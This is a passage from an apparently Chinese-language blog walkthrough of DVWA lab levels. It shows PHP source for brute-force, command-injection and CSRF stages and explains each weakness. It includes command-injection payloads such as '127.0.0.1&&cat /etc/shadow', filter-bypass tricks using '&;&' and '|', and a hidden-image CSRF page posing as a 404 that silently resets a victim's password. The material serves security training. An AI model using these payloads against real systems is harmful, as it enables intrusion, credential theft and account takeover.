&#123;</span><br><span class="line">            $account_locked = <span class="keyword">true</span>;</span><br><span class="line">            <span class="comment">// print "The account is locked&lt;br /&gt;";</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (if username matches the password)</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;'</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">':user'</span>, $user, PDO::PARAM_STR);</span><br><span class="line">    $data-&gt;bindParam( <span class="string">':password'</span>, $pass, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">    $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If its a valid login...</span></span><br><span class="line">    <span class="keyword">if</span>( ( $data-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( $account_locked == <span class="keyword">false</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        $avatar       = $row[ <span class="string">'avatar'</span> ];</span><br><span class="line">        $failed_login = $row[ <span class="string">'failed_login'</span> ];</span><br><span class="line">        $last_login   = $row[ <span class="string">'last_login'</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Welcome to the password protected area &lt;em&gt;&#123;$user&#125;&lt;/em&gt;&lt;/p&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Had the account been locked out since last login?</span></span><br><span class="line">        <span class="keyword">if</span>( $failed_login &gt;= $total_failed_login ) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Number of login attempts: &lt;em&gt;&#123;$failed_login&#125;&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Reset bad login count</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;'</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">':user'</span>, $user, PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Give the user some feedback</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in &#123;$lockout_time&#125; minutes&lt;/em&gt;.&lt;/pre&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update bad login count</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;'</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">':user'</span>, $user, PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set the last login time</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;'</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">':user'</span>, $user, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到在该级别中加入了可靠的防爆破机制，当检测到频繁的错误登录之后，系统会将账户锁定，爆破也就无法继续。如果能将爆破字典浓缩在错误次数以内还是可以进行爆破的，但基本上盲破的话无法浓缩这么小的字典。同时在服务器端采用了PDO(PHP Data Object)机制防御sql注入，PDO是PHP中一个轻量级的、具体兼容接口的PHP数据连接拓展，在php5.1以后的版本中的可以进行使用。PDO 提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。因为不能使用PDO扩展本身执行任何数据库操作，而sql注入的关键就是通过sql语句结构执行恶意的sql命令。</p>
<h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><p>Command Injection,即命令注入，是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。PHP命令注入攻击漏洞是PHP应用程序中较为常见的脚本漏洞之一，国内著名的web应用程序Discuz!、DedeCMS等都曾经存在过该类型漏洞。</p>
<h3 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = $_REQUEST[ <span class="string">'ip'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>相关函数：stristr(string,search,before_search)</p>
<p>stristr</p>
<p>函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分(从匹配点)，如果未找到所搜索的字符串，则返回false。参数string规定被搜索的字符串，参数search规定要搜索的字符串（若该参数为数字，则所搜匹配该数字对应的ASCII值字符），可选参数before_search为布尔类型，默认为false，若设置为true，函数将返回search参数第一次出现之前的字符串部分。</p>
<p>php_uname(mode)</p>
<p>该函数返回运行php的操作系统的相关描述，参数mode可取值“a”（默认，包含序列“s n r v m”里的所有模式），”s ”（返回操作系统名称），”n”（返回主机名），” r”（返回版本名称），”v”（返回版本信息）， ”m”（返回机器类型）。</p>
<p>从源码看到，服务器通过判断操作系统执行不同ping命令，但是对ip没有做过滤操作，导致严重的命令注入漏洞。</p>
<p>漏洞利用</p>
<p>Windows与Linux系统使用&amp;&amp;执行多条命令</p>
<p>键入：127.0.0.1&amp;&amp;net user</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/11.png" alt></p>
<p>若是部署在linux下，键入127.0.0.1&amp;&amp;cat/etc/shadow甚至可以读取shadow文件。</p>
<h3 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h3><p>服务器端源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = $_REQUEST[ <span class="string">'ip'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    $substitutions = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'&amp;&amp;'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">';'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过源码可以看到，服务器端对ip参数做了部分字符的过滤，即将<code>&amp;&amp;</code>、<code>;</code>进行删除，就是相当于将这两个符号拉入黑名单的机制，但是没有过滤其他的字符，就还是存在安全的问题。</p>
<p>漏洞利用</p>
<p><strong>方式一</strong>：键入：127.0.0.1&amp;net user</p>
<p>因为被过滤的只有<code>&amp;&amp;</code>与<code>;</code>所以<code>&amp;</code>没有影响。</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/12.png" alt></p>
<p>tips:  在cmd命令中 <code>&amp;&amp;</code>和<code>&amp;</code>的区别</p>
<p>Command1&amp;&amp;Command2</p>
<p>先执行Command1，执行成功后再执行Command2，否则不执行Command2</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/13.png" alt></p>
<p>Command1&amp;Command2</p>
<p>先执行Command1，不管是否执行成功，都会执行Command2</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/14.png" alt></p>
<p><strong>方式二</strong>：由于使用str_replace把<code>&amp;&amp;</code>、<code>;</code>替换为空字符，因此可以采用中&amp;&amp;中间用分号隔开，即：127.0.0.1&amp;;&amp;ipconfig</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/15.png" alt></p>
<p>能够成功执行的原因是在服务器端将提交的数据先进行&amp;&amp;的检查，由于中间存在分号，函数检查不到&amp;&amp;符号，所以不会将其删除，再进行分号的检查，并将分号变为空字符，这样原命令变为127.0.0.1&amp;&amp;ipconfig，会执行成功。</p>
<h3 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = trim($_REQUEST[ <span class="string">'ip'</span> ]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    $substitutions = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'&amp;'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">';'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'| '</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'-'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'$'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'('</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">')'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'`'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'||'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过源码可以看到，服务器端对更多的字符进行了过滤，但是由于黑名单机制的局限性，还是可以进行绕过的。</p>
<p>漏洞利用</p>
<p>从黑名单看像是过滤了所有的非法字符，但是仔细观察发现是把 “| ”（ps这边的|后面还有一个空格）替换成空字符，于是就可以通过<code>|</code>进行漏洞利用。</p>
<p>键入：127.0.0.1|net user</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/16.png" alt></p>
<p>tips:Command1|Command2</p>
<p><code>|</code>是管道符，表示将Command1的输出作为Command2的输入，并且只打印Command2执行的结果。</p>
<h3 id="Impossible-1"><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = $_REQUEST[ <span class="string">'ip'</span> ];</span><br><span class="line">    $target = stripslashes( $target );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Split the IP into 4 octects</span></span><br><span class="line">    $octet = explode( <span class="string">"."</span>, $target );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check IF each octet is an integer</span></span><br><span class="line">    <span class="keyword">if</span>( ( is_numeric( $octet[<span class="number">0</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">1</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">2</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">3</span>] ) ) &amp;&amp; ( sizeof( $octet ) == <span class="number">4</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// If all 4 octets are int's put the IP back together.</span></span><br><span class="line">        $target = $octet[<span class="number">0</span>] . <span class="string">'.'</span> . $octet[<span class="number">1</span>] . <span class="string">'.'</span> . $octet[<span class="number">2</span>] . <span class="string">'.'</span> . $octet[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">        <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// Windows</span></span><br><span class="line">            $cmd = shell_exec( <span class="string">'ping  '</span> . $target );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// *nix</span></span><br><span class="line">            $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Ops. Let the user name theres a mistake</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>相关函数</p>
<p>stripslashes(string)</p>
<p>stripslashes函数会删除字符串string中的反斜杠，返回已剥离反斜杠的字符串。</p>
<p>explode(separator,string,limit)</p>
<p>把字符串打散为数组，返回字符串的数组。参数separator规定在哪里分割字符串，参数string是要分割的字符串，可选参数limit规定所返回的数组元素的数目。</p>
<p>is_numeric(string)</p>
<p>检测string是否为数字或者数字字符串，如果是则返回true，否则返回false。</p>
<p>从源码中可以看到在该级别中加入了Anti-CSRF token，同时对参数ip进行严格的限制，只有像：number.number.number.number的输入才会被接收，因此不存在命令注入漏洞。</p>
<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>CSRF，全程Cross-site request forgery,跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等)，诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作。</p>
<p>CSRF与XSS最大的区别在于，CSRF并没有盗取cookie而是直接利用。</p>
<h3 id="Low-2"><a href="#Low-2" class="headerlink" title="Low"></a>Low</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">        $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>从源码中看到服务器收到修改密码的请求后，会检查参数password_new与password_conf是否相同，如果相同，就会修改密码，并没有任何的防护CSRF机制，但是在服务器中对请求的发送者是做了身份验证的，是检查cookie，只是在代码中没有进行体现。</p>
<p>漏洞利用</p>
<p>1.构造链接：</p>
<p>1）基础版：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">172.18</span>.<span class="number">9.91</span><span class="regexp">/DVWA-master/</span>vulnerabilities<span class="regexp">/csrf/</span>?password_new=password&amp;password_conf=password&amp;Change=Change<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>ps:CSRF最关键的是利用受害者的cookie，向服务器发送伪造请求，所以如果受害者之前用chrome浏览器登录的这个系统，而用搜狗浏览器点击这个链接，攻击是不会触发的，因为在搜狗浏览器中并不能了利用chrome浏览器的cookie，所以会自动跳转到登录见面。</p>
<p>这么比较基础的CSRF，链接比较明显，基本上不会有人去点击，在真正的攻击中需要对链接进行处理。</p>
<p>2）使用短链接隐藏URL，点击短链接会自动跳转到真实的网站</p>
<p>如：<a href="https://dwz.cn/" target="_blank" rel="noopener">https://dwz.cn/</a>****</p>
<p>但是目前这个站点只为企业提供服务了，并且由于是本地搭建的环境，服务器域名是ip地址，所以无法生成相应的短链接，实际攻击场景下只要目标服务器的域名不是ip，是可以生成相应短链接的。</p>
<p>ps：虽然利用短链接隐藏了url，但是受害者最终还是会看到密码修改成功的页面，所以这种方式并不是高明的</p>
<p>3)构造攻击页面</p>
<p>现实攻击场景下，这种方法需要实现在公网上传一个攻击页面，诱骗受害者访问，真正能够在受害者不知情的情况下完成CSRF攻击。</p>
<p>在本地写一个test.html，源码如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://172.18.9.91/DVWA-master/vulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=Change#"</span> <span class="attr">border</span>=<span class="string">"0"</span> <span class="attr">style</span>=<span class="string">"display:none;"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>404<span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>file not found.<span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当受害者访问test.html时，会误认为自己点击的是一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改为hack。</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/17.png" alt></p>
<h3 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h3><p>服务端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Checks to see where the request came from</span></span><br><span class="line">    <span class="keyword">if</span>( stripos( $_SERVER[ <span class="string">'HTTP_REFERER'</span> ] ,$_SERVER[ <span class="string">'SERVER_NAME'</span> ]) !== <span class="keyword">false</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        $pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">        $pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do the passwords 